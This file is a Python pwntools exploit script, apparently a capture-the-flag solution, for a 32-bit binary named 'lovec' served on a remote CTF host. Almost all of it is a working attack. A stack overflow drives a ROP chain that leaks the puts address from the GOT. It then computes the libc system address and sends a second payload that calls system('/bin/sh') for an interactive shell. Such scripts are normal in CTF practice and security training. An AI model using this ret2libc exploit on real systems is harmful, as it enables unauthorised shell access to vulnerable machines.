#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

fn = './lovec'
elf = ELF(fn)

name_addr = 0x0804A048

if len(sys.argv) == 1:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    io = process(fn)
else:
    libc = ELF('./libc.so.6')
    io = remote('bamboofox.cs.nctu.edu.tw', 11003)

name = '/bin/sh'.ljust(20, '\x00') + '\xff'
io.sendafter(':\n', name)

io.sendafter('10. C\n', '1')

payload = ''.join([
    'a' * (0x1d + 12),
    p32(elf.symbols['puts']),
    p32(elf.symbols['_start']),
    p32(elf.got['puts']),
])

io.sendafter('?\n', payload)

io.recvuntil('day!\n')
puts_addr = u32(io.recv(4))
log.success('puts_addr = %s', hex(puts_addr))

system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr
log.success('system_addr = %s', hex(system_addr))

io.sendafter(':\n', name)
io.sendafter('10. C\n', '1')

payload = ''.join([
    'a' * (0x1d + 12),
    p32(system_addr),
    p32(0xdeadbeef),
    p32(name_addr),
])

io.sendafter('?\n', payload)

io.interactive()
